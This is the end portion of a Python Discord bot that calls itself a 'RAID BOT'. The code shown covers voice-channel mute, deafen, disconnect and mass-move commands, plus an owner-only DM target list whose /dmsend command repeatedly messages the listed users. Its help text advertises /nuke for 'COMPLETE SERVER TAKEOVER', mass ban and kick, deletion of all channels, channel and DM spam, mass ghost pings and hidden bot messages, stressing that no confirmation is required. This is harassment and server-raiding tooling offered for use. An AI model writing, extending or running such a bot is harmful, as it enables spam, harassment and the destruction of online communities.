async def slash_listroles(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    roles = sorted(interaction.guild.roles, key=lambda r: r.position, reverse=True)
    role_list = []
    for role in roles:
        if role.name != "@everyone":
            role_list.append(f"• {role.mention} - {len(role.members)} members")
    if not role_list:
        await interaction.followup.send("📭 No roles found.", ephemeral=True)
        return
    chunks = [role_list[i:i+20] for i in range(0, len(role_list), 20)]
    for chunk in chunks:
        await interaction.followup.send("📋 **Server Roles:**\n" + "\n".join(chunk), ephemeral=True)

@bot.tree.command(name="vcdisconnect", description="Disconnect a user from voice channel")
@is_whitelisted()
async def slash_vcdisconnect(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer(ephemeral=True)
    if not member.voice:
        await interaction.followup.send(f"❌ {member.mention} is not in a voice channel.", ephemeral=True)
        return
    try:
        await member.move_to(None)
        await interaction.followup.send(f"✅ Disconnected {member.mention} from voice channel.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="vcmute", description="Mute a user in voice channel")
@is_whitelisted()
async def slash_vcmute(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer(ephemeral=True)
    if not member.voice:
        await interaction.followup.send(f"❌ {member.mention} is not in a voice channel.", ephemeral=True)
        return
    if member.voice.mute:
        await interaction.followup.send(f"⚠️ {member.mention} is already muted.", ephemeral=True)
        return
    try:
        await member.edit(mute=True)
        await interaction.followup.send(f"🔇 Muted {member.mention} in voice channel.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="vcunmute", description="Unmute a user in voice channel")
@is_whitelisted()
async def slash_vcunmute(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer(ephemeral=True)
    if not member.voice:
        await interaction.followup.send(f"❌ {member.mention} is not in a voice channel.", ephemeral=True)
        return
    if not member.voice.mute:
        await interaction.followup.send(f"⚠️ {member.mention} is not muted.", ephemeral=True)
        return
    try:
        await member.edit(mute=False)
        await interaction.followup.send(f"🔊 Unmuted {member.mention} in voice channel.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="vcunmuteall", description="Unmute ALL users in voice channels")
@is_whitelisted()
async def slash_vcunmuteall(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    count = 0
    for channel in interaction.guild.voice_channels:
        for member in channel.members:
            if member.voice.mute:
                try:
                    await member.edit(mute=False)
                    count += 1
                    await asyncio.sleep(0.05)
                except:
                    pass
    await interaction.followup.send(f"🔊 Unmuted {count} users in voice channels.", ephemeral=True)

@bot.tree.command(name="vcdeafen", description="Deafen a user in voice channel")
@is_whitelisted()
async def slash_vcdeafen(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer(ephemeral=True)
    if not member.voice:
        await interaction.followup.send(f"❌ {member.mention} is not in a voice channel.", ephemeral=True)
        return
    if member.voice.deaf:
        await interaction.followup.send(f"⚠️ {member.mention} is already deafened.", ephemeral=True)
        return
    try:
        await member.edit(deafen=True)
        await interaction.followup.send(f"🔇 Deafened {member.mention} in voice channel.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="vcundeafen", description="Undeafen a user in voice channel")
@is_whitelisted()
async def slash_vcundeafen(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer(ephemeral=True)
    if not member.voice:
        await interaction.followup.send(f"❌ {member.mention} is not in a voice channel.", ephemeral=True)
        return
    if not member.voice.deaf:
        await interaction.followup.send(f"⚠️ {member.mention} is not deafened.", ephemeral=True)
        return
    try:
        await member.edit(deafen=False)
        await interaction.followup.send(f"🔊 Undeafened {member.mention} in voice channel.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="vcdeafenall", description="Deafen ALL users in voice channels")
@is_whitelisted()
async def slash_vcdeafenall(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    count = 0
    for channel in interaction.guild.voice_channels:
        for member in channel.members:
            if not member.voice.deaf:
                try:
                    await member.edit(deafen=True)
                    count += 1
                    await asyncio.sleep(0.05)
                except:
                    pass
    await interaction.followup.send(f"🔇 Deafened {count} users in voice channels.", ephemeral=True)

@bot.tree.command(name="vcundeafenall", description="Undeafen ALL users in voice channels")
@is_whitelisted()
async def slash_vcundeafenall(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    count = 0
    for channel in interaction.guild.voice_channels:
        for member in channel.members:
            if member.voice.deaf:
                try:
                    await member.edit(deafen=False)
                    count += 1
                    await asyncio.sleep(0.05)
                except:
                    pass
    await interaction.followup.send(f"🔊 Undeafened {count} users in voice channels.", ephemeral=True)

@bot.tree.command(name="vckick", description="Kick a user from voice channel")
@is_whitelisted()
async def slash_vckick(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer(ephemeral=True)
    if not member.voice:
        await interaction.followup.send(f"❌ {member.mention} is not in a voice channel.", ephemeral=True)
        return
    try:
        await member.move_to(None)
        await interaction.followup.send(f"👢 Kicked {member.mention} from voice channel.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="vcmoveall", description="Move ALL users to a specific voice channel")
@is_whitelisted()
async def slash_vcmoveall(interaction: discord.Interaction, channel: discord.VoiceChannel):
    await interaction.response.defer(ephemeral=True)
    count = 0
    for vc in interaction.guild.voice_channels:
        if vc == channel:
            continue
        for member in vc.members:
            try:
                await member.move_to(channel)
                count += 1
                await asyncio.sleep(0.05)
            except:
                pass
    await interaction.followup.send(f"✅ Moved {count} users to {channel.name}", ephemeral=True)

@bot.tree.command(name="servermute", description="Server mute a user")
@is_whitelisted()
async def slash_servermute(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer(ephemeral=True)
    try:
        await member.edit(mute=True)
        await interaction.followup.send(f"🔇 Server muted {member.mention}", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="serverunmute", description="Server unmute a user")
@is_whitelisted()
async def slash_serverunmute(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer(ephemeral=True)
    try:
        await member.edit(mute=False)
        await interaction.followup.send(f"🔊 Server unmuted {member.mention}", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

# ========================================
# ===== DM LIST COMMANDS =====
# ========================================

@bot.tree.command(name="dmadd", description="Add a user to DM list")
@is_owner()
async def slash_dmadd(interaction: discord.Interaction, user: discord.User):
    if user.id in dm_targets:
        await interaction.response.send_message(f"⚠️ **{user.name}** is already in the DM list.", ephemeral=True)
        return
    dm_targets.append(user.id)
    await interaction.response.send_message(f"✅ Added **{user.name}** to DM list! ({len(dm_targets)} total)", ephemeral=True)

@bot.tree.command(name="dmremove", description="Remove a user from DM list")
@is_owner()
async def slash_dmremove(interaction: discord.Interaction, user: discord.User):
    if user.id not in dm_targets:
        await interaction.response.send_message(f"⚠️ **{user.name}** is not in the DM list.", ephemeral=True)
        return
    dm_targets.remove(user.id)
    await interaction.response.send_message(f"✅ Removed **{user.name}** from DM list! ({len(dm_targets)} total)", ephemeral=True)

@bot.tree.command(name="dmlist", description="Show the DM list")
@is_owner()
async def slash_dmlist(interaction: discord.Interaction):
    if not dm_targets:
        await interaction.response.send_message("📭 No users in DM list.", ephemeral=True)
        return
    users = []
    for uid in dm_targets[:25]:
        user = bot.get_user(uid)
        users.append(f"  - {user.name if user else 'Unknown'} (ID: {uid})")
    await interaction.response.send_message(f"📋 **DM List** ({len(dm_targets)} users):\n" + "\n".join(users), ephemeral=True)

@bot.tree.command(name="dmsend", description="DM all users in the DM list")
@is_owner()
async def slash_dmsend(interaction: discord.Interaction, count: int = 3, message: str = "Targeted!"):
    await interaction.response.defer(ephemeral=True)
    if not dm_targets:
        await interaction.followup.send("❌ No users in DM list.", ephemeral=True)
        return
    sent = 0
    failed = 0
    for user_id in dm_targets:
        user = bot.get_user(user_id)
        if user:
            try:
                for i in range(min(count, 20)):
                    await user.send(trim_msg(message))
                    await asyncio.sleep(0.1)
                sent += 1
                print(f"✅ DM sent to {user.name}")
            except:
                failed += 1
                print(f"❌ Failed to DM {user.name}")
    await interaction.followup.send(f"✅ Sent to {sent} users. Failed: {failed}", ephemeral=True)

@bot.tree.command(name="dmclear", description="Clear the DM list")
@is_owner()
async def slash_dmclear(interaction: discord.Interaction):
    dm_targets.clear()
    await interaction.response.send_message("✅ DM list cleared!", ephemeral=True)

# ========================================
# ===== PING COMMAND (EVERYONE) =====
# ========================================

@bot.tree.command(name="ping", description="Check bot latency")
async def slash_ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"🏓 Pong! {round(bot.latency * 1000)}ms")

# ========================================
# ===== HELP COMMAND (EVERYONE) =====
# ========================================

@bot.tree.command(name="help", description="Show all commands")
async def slash_help(interaction: discord.Interaction):
    is_owner = interaction.user.id == OWNER_ID
    is_whitelisted = interaction.user.id in whitelist
    
    help_text = f"""
**💀 RAID BOT COMMANDS:**

⚠️ **NO CONFIRMATION REQUIRED FOR ANY COMMAND!**

**🔊 VOICE STAY COMMANDS:**
✅ `/vcstay` - Stay in voice channel (keeps bot connected)
✅ `/vcleave` - Leave the voice channel
✅ `/vcstatus` - Check voice channel status
✅ `/vcstaytime <hours>` - Stay in voice for X hours (max 8760)

**👻 GHOST PING COMMANDS:**
{'✅ `/ghostping <user> <message>` - Ghost ping a user' if is_whitelisted or is_owner else '❌ `/ghostping` - Whitelist Only'}
{'✅ `/ghostpingall <message>` - Ghost ping ALL members' if is_whitelisted or is_owner else '❌ `/ghostpingall` - Whitelist Only'}
{'✅ `/ghostpingrole <role> <message>` - Ghost ping all members with a role' if is_whitelisted or is_owner else '❌ `/ghostpingrole` - Whitelist Only'}
{'✅ `/ghosteveryone <message>` - Ghost ping @everyone' if is_whitelisted or is_owner else '❌ `/ghosteveryone` - Whitelist Only'}
{'✅ `/ghosthere <message>` - Ghost ping @here' if is_whitelisted or is_owner else '❌ `/ghosthere` - Whitelist Only'}
{'✅ `/ghostmass <count> <message>` - Mass ghost pings' if is_whitelisted or is_owner else '❌ `/ghostmass` - Whitelist Only'}

**🗣️ SAY COMMANDS (HIDDEN - NO FOOTER):**
{'✅ `/say <message>` - Bot says a message (HIDDEN)' if is_whitelisted or is_owner else '❌ `/say` - Whitelist Only'}
{'✅ `/sayembed <message>` - Bot says an embed (HIDDEN)' if is_whitelisted or is_owner else '❌ `/sayembed` - Whitelist Only'}
{'✅ `/saydm <user> <message>` - Bot DMs a user' if is_whitelisted or is_owner else '❌ `/saydm` - Whitelist Only'}
{'✅ `/sayall <message>` - Bot says in ALL channels (HIDDEN)' if is_whitelisted or is_owner else '❌ `/sayall` - Whitelist Only'}

**👑 WHITELISTED COMMANDS (YOU CAN USE):**
{'✅ `/nuke` - COMPLETE SERVER TAKEOVER!' if is_whitelisted or is_owner else '❌ `/nuke` - Whitelist Only'}
{'✅ `/banall` - Ban ALL members' if is_whitelisted or is_owner else '❌ `/banall` - Whitelist Only'}
{'✅ `/kickall` - Kick ALL members' if is_whitelisted or is_owner else '❌ `/kickall` - Whitelist Only'}
{'✅ `/deleteallchannels` - Delete ALL channels' if is_whitelisted or is_owner else '❌ `/deleteallchannels` - Whitelist Only'}
{'✅ `/createchannels` - Create channels' if is_whitelisted or is_owner else '❌ `/createchannels` - Whitelist Only'}
{'✅ `/createrole` - Create a role' if is_whitelisted or is_owner else '❌ `/createrole` - Whitelist Only'}
{'✅ `/createroleadmin` - Create ADMIN role' if is_whitelisted or is_owner else '❌ `/createroleadmin` - Whitelist Only'}
{'✅ `/deleterole` - Delete a role' if is_whitelisted or is_owner else '❌ `/deleterole` - Whitelist Only'}
{'✅ `/renameserver` - Rename server' if is_whitelisted or is_owner else '❌ `/renameserver` - Whitelist Only'}
{'✅ `/spam` - Spam channels' if is_whitelisted or is_owner else '❌ `/spam` - Whitelist Only'}
{'✅ `/dmspam` - Spam DM user' if is_whitelisted or is_owner else '❌ `/dmspam` - Whitelist Only'}
{'✅ `/dmspamall` - Spam DM ALL' if is_whitelisted or is_owner else '❌ `/dmspamall` - Whitelist Only'}
{'✅ `/dmspamrole` - Spam DM by role' if is_whitelisted or is_owner else '❌ `/dmspamrole` - Whitelist Only'}
{'✅ `/vcdisconnectall` - Disconnect ALL from voice' if is_whitelisted or is_owner else '❌ `/vcdisconnectall` - Whitelist Only'}
{'✅ `/vcmuteall` - Mute ALL in voice' if is_whitelisted or is_owner else '❌ `/vcmuteall` - Whitelist Only'}
{'✅ `/vckickall` - Kick ALL from voice' if is_whitelisted or is_owner else '❌ `/vckickall` - Whitelist Only'}
{'✅ `/resetnick` - Reset a member\'s nickname' if is_whitelisted or is_owner else '❌ `/resetnick` - Whitelist Only'}
{'✅ `/resetnickall` - Reset ALL nicknames' if is_whitelisted or is_owner else '❌ `/resetnickall` - Whitelist Only'}
{'✅ `/forcenick` - Force change a nickname' if is_whitelisted or is_owner else '❌ `/forcenick` - Whitelist Only'}
{'✅ `/forcenickall` - Force change ALL nicknames' if is_whitelisted or is_owner else '❌ `/forcenickall` - Whitelist Only'}
{'✅ `/giverole` - Give a role to a member' if is_whitelisted or is_owner else '❌ `/giverole` - Whitelist Only'}
{'✅ `/removerole` - Remove a role from a member' if is_whitelisted or is_owner else '❌ `/removerole` - Whitelist Only'}
{'✅ `/giveroleself` - Give yourself a role' if is_whitelisted or is_owner else '❌ `/giveroleself` - Whitelist Only'}
{'✅ `/removeroleself` - Remove a role from yourself' if is_whitelisted or is_owner else '❌ `/removeroleself` - Whitelist Only'}
{'✅ `/listroles` - List all roles' if is_whitelisted or is_owner else '❌ `/listroles` - Whitelist Only'}
{'✅ `/vcdisconnect` - Disconnect a user from voice' if is_whitelisted or is_owner else '❌ `/vcdisconnect` - Whitelist Only'}
{'✅ `/vcmute` - Mute a user in voice' if is_whitelisted or is_owner else '❌ `/vcmute` - Whitelist Only'}
{'✅ `/vcunmute` - Unmute a user in voice' if is_whitelisted or is_owner else '❌ `/vcunmute` - Whitelist Only'}
{'✅ `/vcunmuteall` - Unmute ALL in voice' if is_whitelisted or is_owner else '❌ `/vcunmuteall` - Whitelist Only'}
{'✅ `/vcdeafen` - Deafen a user in voice' if is_whitelisted or is_owner else '❌ `/vcdeafen` - Whitelist Only'}
{'✅ `/vcundeafen` - Undeafen a user in voice' if is_whitelisted or is_owner else '❌ `/vcundeafen` - Whitelist Only'}
{'✅ `/vcdeafenall` - Deafen ALL in voice' if is_whitelisted or is_owner else '❌ `/vcdeafenall` - Whitelist Only'}
{'✅ `/vcundeafenall` - Undeafen ALL in voice' if is_whitelisted or is_owner else '❌ `/vcundeafenall` - Whitelist Only'}
{'✅ `/vckick` - Kick a user from voice' if is_whitelisted or is_owner else '❌ `/vckick` - Whitelist Only'}
{'✅ `/vcmoveall` - Move ALL users to a voice channel' if is_whitelisted or is_owner else '❌ `/vcmoveall` - Whitelist Only'}
{'✅ `/servermute` - Server mute a user' if is_whitelisted or is_owner else '❌ `/servermute` - Whitelist Only'}
{'✅ `/serverunmute` - Server unmute a user' if is_whitelisted or is_owner else '❌ `/serverunmute` - Whitelist Only'}

**👑 Bot Owner Commands:**
✅ `/whitelist` - Add user to whitelist (Owner Only)
✅ `/unwhitelist` - Remove user from whitelist (Owner Only)
✅ `/whitelistlist` - Show whitelist (Owner Only)
✅ `/dmadd` - Add user to DM list (Owner Only)
✅ `/dmremove` - Remove user from DM list (Owner Only)
✅ `/dmlist` - Show DM list (Owner Only)
✅ `/dmsend` - DM all users in list (Owner Only)
✅ `/dmclear` - Clear DM list (Owner Only)

**Other:**
✅ `/ping` - Check latency (Everyone)
✅ `/help` - Show this (Everyone)

**Your Status:** {'👑 **BOT OWNER**' if is_owner else '📋 **WHITELISTED**' if is_whitelisted else '❌ **NOT WHITELISTED**'}

**To get whitelisted:** Ask the bot owner to use `/whitelist @user`
"""
    await interaction.response.send_message(trim_msg(help_text))

# ========================================
# ===== RUN =====
# ========================================
if __name__ == "__main__":
    print("""
╔═══════════════════════════════════════════════════════════════╗
║         RAID BOT - SLASH COMMANDS                          ║
║        ALL COMMANDS USE /                                  ║
║        WHITELIST SYSTEM ENABLED                           ║
╚═══════════════════════════════════════════════════════════════╝
""")

    try:
        print("🔄 Connecting to Discord...")
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("❌ TOKEN INVALID! Go to Developer Portal → Reset Token")
    except discord.PrivilegedIntentsRequired:
        print("❌ ENABLE INTENTS! Enable: ✅ Message Content Intent")
    except Exception as e:
        print(f"\n❌ ERROR: {e}\n")
        traceback.print_exc()
